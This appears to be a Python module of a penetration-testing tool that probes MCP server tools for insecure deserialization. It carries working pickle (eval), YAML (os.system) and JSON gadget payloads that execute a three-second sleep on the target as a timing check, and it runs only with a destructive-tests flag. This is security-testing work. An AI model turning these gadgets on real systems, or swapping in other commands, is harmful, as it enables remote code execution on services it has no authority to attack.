"""Insecure deserialization tests.

These probes send payloads that attempt to sleep on the target interpreter.
They are destructive and only run with ``--allow-destructive``.  A delay is
reported as a timing oracle with moderate confidence; it is never promoted to
confirmed RCE without a repeatable result, and the report says so.
"""
from __future__ import annotations

import base64
import logging

from core.evidence import make_finding
from core.protocol import (
    ProtocolError,
    RequestTimeout,
    SafetyLimitExceeded,
    TransportError,
    content_summary,
    result_text,
)

logger = logging.getLogger("mcpwn.deserialization")

SUSPICIOUS_HINTS = ("base64", "token", "state", "data", "obj", "key",
                    "payload", "serial", "blob", "session")
SLEEP_SECONDS = 3


class DeserializationTest:
    """Test for insecure deserialization vulnerabilities."""

    def __init__(self, pentester):
        self.pentester = pentester

    def _generate_valid_payload(self, tool, override_args=None):
        override_args = override_args or {}
        schema = tool.get("inputSchema", {}) or {}
        args = {}
        for prop, spec in schema.get("properties", {}).items():
            if prop in override_args:
                args[prop] = override_args[prop]
            elif isinstance(spec, dict) and spec.get("type") == "string":
                args[prop] = "test"
            elif isinstance(spec, dict) and spec.get("type") in (
                    "integer", "number"):
                args[prop] = 1
            elif isinstance(spec, dict) and spec.get("type") == "boolean":
                args[prop] = True
        return {"name": tool.get("name"), "arguments": args}

    def run(self, tool):
        try:
            self.pentester.policy.require_destructive("deserialization tests")
        except SafetyLimitExceeded as exc:
            logger.info("%s", exc)
            return []
        findings = []
        schema = tool.get("inputSchema", {}) or {}
        for arg, spec in list(schema.get("properties", {}).items())[:5]:
            if not isinstance(spec, dict) or spec.get("type") != "string":
                continue
            description = str(spec.get("description", "")).lower()
            name = arg.lower()
            suspicious = any(hint in name or hint in description
                             for hint in SUSPICIOUS_HINTS)
            if not suspicious:
                continue
            findings.extend(self._test_pickle(tool, arg))
            findings.extend(self._test_yaml(tool, arg))
            findings.extend(self._test_json_gadgets(tool, arg))
        return findings

    def _probe_timing(self, tool, arg, payload):
        """Return (first_elapsed, repeat_elapsed, response) or ``None``."""
        baseline = self.pentester.measure_baseline("ping", {}, samples=3)
        if baseline is None:
            return None
        params = self._generate_valid_payload(tool, {arg: payload})
        try:
            response, first = self.pentester.send(
                "tools/call", params, skip_analysis=True)
            _, repeat = self.pentester.send(
                "tools/call", params, skip_analysis=True)
        except (TransportError, ProtocolError, RequestTimeout,
                SafetyLimitExceeded):
            return None
        return baseline, first, repeat, response

    def _test_pickle(self, tool, arg):
        blind_payload = base64.b64encode(
            b'\x80\x03cbuiltins\neval\nX\x11\x00\x00\x00'
            b'__import__("time").sleep(3)\x85R.'
        ).decode()
        result = self._probe_timing(tool, arg, blind_payload)
        if not result:
            return []
        baseline, first, repeat, response = result
        if min(first, repeat) <= baseline + 2.0:
            return []
        return [make_finding(
            "PICKLE_DESERIALIZATION_BLIND",
            tool=tool.get("name"),
            arg=arg,
            payload="<base64 pickle sleep({})>".format(SLEEP_SECONDS),
            severity="HIGH",
            confidence=45,
            verified=False,
            evidence=[
                "baseline {:.2f}s, probes {:.2f}s / {:.2f}s".format(
                    baseline, first, repeat),
                content_summary(response, 200),
            ],
            note="reproducible delay; timing oracle, not output-confirmed RCE",
        )]

    def _test_yaml(self, tool, arg):
        findings = []
        for payload in (
                "!!python/object/apply:time.sleep [{}]".format(SLEEP_SECONDS),
                "!!python/object/apply:os.system ['sleep {}']".format(
                    SLEEP_SECONDS)):
            result = self._probe_timing(tool, arg, payload)
            if not result:
                continue
            baseline, first, repeat, response = result
            text = result_text(response)
            if min(first, repeat) > baseline + 2.0:
                findings.append(make_finding(
                    "YAML_DESERIALIZATION",
                    tool=tool.get("name"),
                    arg=arg,
                    payload=payload,
                    severity="HIGH",
                    confidence=45,
                    verified=False,
                    evidence=[
                        "baseline {:.2f}s, probes {:.2f}s / {:.2f}s".format(
                            baseline, first, repeat),
                    ],
                    note="timing oracle only; manual reproduction required",
                ))
                break
            if "ConstructorError" in text:
                findings.append(make_finding(
                    "YAML_UNSAFE_LOAD_HINT",
                    tool=tool.get("name"),
                    arg=arg,
                    payload=payload,
                    severity="MEDIUM",
                    confidence=35,
                    evidence=[content_summary(response, 200)],
                    note="parser error mentions a constructor; loader review "
                         "required",
                ))
                break
        return findings

    def _test_json_gadgets(self, tool, arg):
        findings = []
        gadgets = (
            '{"py/object": "time.sleep", "py/arg": %d}' % SLEEP_SECONDS,
            '{"py/reduce": [{"py/type": "time.sleep"}, '
            '{"py/tuple": [%d]}]}' % SLEEP_SECONDS,
            '{"@type":"java.lang.Runtime"}',
        )
        for payload in gadgets:
            result = self._probe_timing(tool, arg, payload)
            if not result:
                continue
            baseline, first, repeat, response = result
            if min(first, repeat) > baseline + 2.0:
                findings.append(make_finding(
                    "JSON_GADGET_RCE",
                    tool=tool.get("name"),
                    arg=arg,
                    payload=payload,
                    severity="HIGH",
                    confidence=40,
                    verified=False,
                    evidence=[
                        "baseline {:.2f}s, probes {:.2f}s / {:.2f}s".format(
                            baseline, first, repeat),
                    ],
                    note="timing oracle only; not confirmed code execution",
                ))
                break
            text = result_text(response)
            if any(indicator in text for indicator in (
                    "ClassNotFoundException", "autoType")):
                findings.append(make_finding(
                    "JSON_GADGET_PARSED",
                    tool=tool.get("name"),
                    arg=arg,
                    payload=payload,
                    severity="MEDIUM",
                    confidence=40,
                    evidence=[content_summary(response, 200)],
                    note="deserializer processed type metadata",
                ))
                break
        return findings
